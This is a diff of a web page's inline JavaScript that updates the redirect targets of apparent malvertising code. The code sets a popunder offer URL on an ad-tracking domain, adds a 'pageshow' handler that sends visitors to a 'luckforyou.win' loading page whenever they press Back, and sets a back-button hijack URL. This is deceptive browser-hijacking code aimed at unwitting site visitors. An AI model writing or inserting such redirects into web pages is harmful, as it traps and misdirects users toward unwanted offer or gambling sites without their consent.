@@ -13,8 +13,8 @@
   
     <link href="/public/styles/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
     <script>
-            var offer_url = redirectUrl;
-            var split_url = "https://luckforyou.win/loading.html?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=popunder&c2=MX";
+            var offer_url = "https://ig2kv.bemobtrcks.com/go/345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=popunder&c2=MX";
+            var split_url = "https://www.luckforyou.win/api/loading.php?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=popunder&c2=MX";
         
             function go() {
                 window.onbeforeunload = null;
@@ -26,12 +26,12 @@
         </script>
         <script>
             window.addEventListener("pageshow", function (event) {
-                (event.persisted || "back_forward" == performance.getEntriesByType("navigation")[0].type) && (window.location.href = "https://luckforyou.win/loading.html?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=BBR&c2=MX")
+                (event.persisted || "back_forward" == performance.getEntriesByType("navigation")[0].type) && (window.location.href = "https://www.luckforyou.win/api/loading.php?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=BBR&c2=MX")
             });
         </script>
         <script>
         
-            var bbURL = "https://luckforyou.win/loading.html?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=BBR&c2=MX";
+            var bbURL = "https://www.luckforyou.win/api/loading.php?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=BBR&c2=MX";
         
             !function () {
                 var a;
